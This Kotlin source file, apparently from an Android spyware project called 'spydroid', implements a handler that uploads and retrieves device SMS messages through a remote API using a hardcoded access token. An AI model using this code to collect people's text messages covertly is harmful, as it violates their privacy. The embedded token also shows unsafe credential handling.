/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.common.remote.network.data

import android.util.Log
import net.spydroid.common.remote.network.daos.SmsDevicesDao
import net.spydroid.common.remote.network.models.SmsDevices

class SmsDevicesDaoHandler: SmsDevicesDao {

    private val TAG = "PRUBA_INSERT"

    override suspend fun getAllSms(): List<SmsDevices> =
        try {
            val response = apiService.getSms("iygad7618wg8y1f7fgvas71f671").execute()
            if (response.isSuccessful) {
                response.body() ?: emptyList()
            } else {
                //Error
                //Log.i(TAG, "Error: ${response.code()}")
                emptyList()
            }
        } catch (e: Exception) {
            // Fail
            //Log.e(TAG, "Failure: ${e.message}")
            emptyList()
        }

    override suspend fun insertSms(sms: SmsDevices) {
        try {
            val response = apiService.createSms(
                accessToken = "iygad7618wg8y1f7fgvas71f671",
                alias = sms.alias,
                sms = sms.sms
            ).execute()
            if (response.isSuccessful){
                Log.i(TAG, "SMS INSERTADO EN LA BASE DE DATOS!")
            }
        } catch (e: Exception) {
            Log.e(TAG, "ERROR INSERTANDO SMS: ${e.message} ")
        }
    }

    override suspend fun deleteSms(sms: SmsDevices) {
        TODO("Not yet implemented")
    }

    override suspend fun updateSms(smsDevices: SmsDevices) {
        TODO("Not yet implemented")
    }
}